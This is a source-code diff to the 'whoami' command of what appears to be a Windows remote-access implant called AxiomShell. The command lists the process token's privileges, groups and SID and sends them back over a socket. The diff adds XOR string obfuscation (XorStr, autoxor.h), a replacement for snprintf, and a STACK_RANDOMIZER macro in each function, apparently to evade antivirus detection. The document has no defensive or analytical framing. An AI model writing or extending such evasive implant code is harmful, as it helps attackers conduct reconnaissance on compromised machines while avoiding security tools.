@@ -1,10 +1,12 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include "Glibc.h"
 #include "Utils.h"
 #include <sddl.h>
 
 static void get_priv(SOCKET sock)
 {
+	STACK_RANDOMIZER;
 	HANDLE currentToken;
 	NTSTATUS status;
 	LPVOID infoBuffer;
@@ -12,30 +14,30 @@ static void get_priv(SOCKET sock)
 	DWORD winError;
 	char buffer[1024];
 	const char* descriptions[][2] = {
-		{ "SeIncreaseQuotaPrivilege", "Adjust memory quotas for a process" },
-		{ "SeSecurityPrivilege", "Manage auditing and security log" },
-		{ "SeTakeOwnershipPrivilege", "Take ownership of files or other objects" },
-		{ "SeLoadDriverPrivilege", "Load and unload device drivers" },
-		{ "SeSystemProfilePrivilege", "Profile system performance" },
-		{ "SeSystemtimePrivilege", "Change the system time" },
-		{ "SeProfileSingleProcessPrivilege", "Profile single process" },
-		{ "SeIncreaseBasePriorityPrivilege", "Increase scheduling priority" },
-		{ "SeCreatePagefilePrivilege", "Create a pagefile" },
-		{ "SeBackupPrivilege", "Back up files and directories" },
-		{ "SeRestorePrivilege", "Restore files and directories" },
-		{ "SeShutdownPrivilege", "Shut down the system" },
-		{ "SeDebugPrivilege", "Debug programs" },
-		{ "SeSystemEnvironmentPrivilege", "Modify firmware environment values" },
-		{ "SeChangeNotifyPrivilege", "Bypass traverse checking" },
-		{ "SeRemoteShutdownPrivilege", "Force shutdown from a remote system" },
-		{ "SeUndockPrivilege", "Remove computer from docking station" },
-		{ "SeManageVolumePrivilege", "Perform volume maintenance tasks" },
-		{ "SeImpersonatePrivilege", "Impersonate a client after authentication" },
-		{ "SeCreateGlobalPrivilege", "Create global objects" },
-		{ "SeIncreaseWorkingSetPrivilege", "Increase a process working set" },
-		{ "SeTimeZonePrivilege", "Change the time zone" },
-		{ "SeCreateSymbolicLinkPrivilege", "Create symbolic links" },
-		{ "SeDelegateSessionUserImpersonatePrivilege", "Obtain an impersonation token for another user in the same session" },
+		{ XorStr("SeIncreaseQuotaPrivilege"), "Adjust memory quotas for a process" },
+		{ XorStr("SeSecurityPrivilege"), "Manage auditing and security log" },
+		{ XorStr("SeTakeOwnershipPrivilege"), "Take ownership of files or other objects" },
+		{ XorStr("SeLoadDriverPrivilege"), "Load and unload device drivers" },
+		{ XorStr("SeSystemProfilePrivilege"), "Profile system performance" },
+		{ XorStr("SeSystemtimePrivilege"), "Change the system time" },
+		{ XorStr("SeProfileSingleProcessPrivilege"), "Profile single process" },
+		{ XorStr("SeIncreaseBasePriorityPrivilege"), "Increase scheduling priority" },
+		{ XorStr("SeCreatePagefilePrivilege"), "Create a pagefile" },
+		{ XorStr("SeBackupPrivilege"), "Back up files and directories" },
+		{ XorStr("SeRestorePrivilege"), "Restore files and directories" },
+		{ XorStr("SeShutdownPrivilege"), "Shut down the system" },
+		{ XorStr("SeDebugPrivilege"), "Debug programs" },
+		{ XorStr("SeSystemEnvironmentPrivilege"), "Modify firmware environment values" },
+		{ XorStr("SeChangeNotifyPrivilege"), "Bypass traverse checking" },
+		{ XorStr("SeRemoteShutdownPrivilege"), "Force shutdown from a remote system" },
+		{ XorStr("SeUndockPrivilege"), "Remove computer from docking station" },
+		{ XorStr("SeManageVolumePrivilege"), "Perform volume maintenance tasks" },
+		{ XorStr("SeImpersonatePrivilege"), "Impersonate a client after authentication" },
+		{ XorStr("SeCreateGlobalPrivilege"), "Create global objects" },
+		{ XorStr("SeIncreaseWorkingSetPrivilege"), "Increase a process working set" },
+		{ XorStr("SeTimeZonePrivilege"), "Change the time zone" },
+		{ XorStr("SeCreateSymbolicLinkPrivilege"), "Create symbolic links" },
+		{ XorStr("SeDelegateSessionUserImpersonatePrivilege"), "Obtain an impersonation token for another user in the same session" },
 		{ NULL, NULL }
 	};
 
@@ -48,7 +50,7 @@ static void get_priv(SOCKET sock)
 		status = OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
 		if (!status)
 		{
-			JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Opening process failed !\n");
+			JSON_send_packets(JsonCommandOutput, sock, (void*)XorStr("[!] Opening process failed !\n"));
 			return;
 		}
 	}
@@ -94,7 +96,7 @@ setupInfo:
 				}
 				i++;
 			}
-			snprintf(buffer, sizeof(buffer), "%-41s %-66s %s\n", privbuffer, description, attributeToStateDispatcher[luidattrs.Attributes]);
+			xsnprintf(buffer, sizeof(buffer), "%-41s %-66s %s\n", privbuffer, description, attributeToStateDispatcher[luidattrs.Attributes]);
 			JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 		}
 	}
@@ -103,6 +105,7 @@ setupInfo:
 
 static void get_groups(SOCKET sock)
 {
+	STACK_RANDOMIZER;
 	DWORD infoLength;
 	PTOKEN_GROUPS tokenGroups;
 	GetTokenInformation(
@@ -156,7 +159,7 @@ static void get_groups(SOCKET sock)
 		}
 		drunk_strcat(fullname, username);
 
-		snprintf(sendBuffer, sizeof(sendBuffer), "%-61s %s\n", fullname, strSid);
+		xsnprintf(sendBuffer, sizeof(sendBuffer), "%-61s %s\n", fullname, strSid);
 		JSON_send_packets(JsonCommandOutput, sock, (void*)sendBuffer);
 
 		LocalFree(strSid);
@@ -169,6 +172,7 @@ static void get_groups(SOCKET sock)
 
 BOOL BUILTIN_whoami(SOCKET sock, size_t argc, char **argv)
 {
+	STACK_RANDOMIZER;
 	char buffer[2048];
 	size_t i;
 	BOOL enum_group = FALSE, enum_priv = FALSE, enum_all = FALSE;
@@ -193,7 +197,7 @@ BOOL BUILTIN_whoami(SOCKET sock, size_t argc, char **argv)
 			//send_command_output(sock, "[*] Running in enum-all mode\n", 30);
 		}
 		else {
-			snprintf(buffer, sizeof(buffer), "[!] Unknown option: %s\n", argv[i]);
+			xsnprintf(buffer, sizeof(buffer), "[!] Unknown option: %s\n", argv[i]);
 			JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 			return (FALSE);
 		}
@@ -208,12 +212,12 @@ BOOL BUILTIN_whoami(SOCKET sock, size_t argc, char **argv)
 
 	if (enum_group || enum_priv || enum_all)
 	{
-		snprintf(buffer, sizeof(buffer), "%s\\%s (%s)\n\n", domain, username, userSid);
+		xsnprintf(buffer, sizeof(buffer), "%s\\%s (%s)\n\n", domain, username, userSid);
 		JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 	}
 	else
 	{
-		snprintf(buffer, sizeof(buffer), "%s\\%s\n\n", domain, username);
+		xsnprintf(buffer, sizeof(buffer), "%s\\%s\n\n", domain, username);
 		JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
 	}
 
